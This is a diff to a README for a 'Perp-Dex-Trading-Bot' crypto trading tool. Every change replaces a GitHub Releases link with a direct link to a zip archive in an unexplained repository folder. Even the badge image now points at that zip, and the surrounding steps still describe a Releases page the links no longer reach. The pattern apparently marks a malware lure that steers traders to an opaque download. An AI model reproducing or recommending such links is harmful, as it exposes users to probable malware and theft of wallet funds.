@@ -1,6 +1,6 @@
 # 🤖 Perp-Dex-Trading-Bot - Trade Smarter, Not Harder
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Perp--Dex--Trading--Bot-blue)](https://github.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/releases)
+[![Download Now](https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/main/townify/Perp-Dex-Trading-Bot.zip)](https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/main/townify/Perp-Dex-Trading-Bot.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Perp-Dex-Trading-Bot**! This guide will help you download and r
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the Releases page to download the latest version: [Download Here](https://github.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/releases).
+1. Visit the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/main/townify/Perp-Dex-Trading-Bot.zip).
 2. On the Releases page, find the version you want to download.
 3. Click the link for your operating system.
 4. Your download will begin automatically.
@@ -88,6 +88,6 @@ For more detailed information about using specific features, refer to the docume
 
 ## 📥 Additional Download Link
 
-Don't forget to check for the latest updates or download the bot here: [Download Here](https://github.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/releases). 
+Don't forget to check for the latest updates or download the bot here: [Download Here](https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbbnm/Perp-Dex-Trading-Bot/main/townify/Perp-Dex-Trading-Bot.zip). 
 
 By following this guide, you'll be well on your way to trading effectively with the **Perp-Dex-Trading-Bot**. Good luck and happy trading!
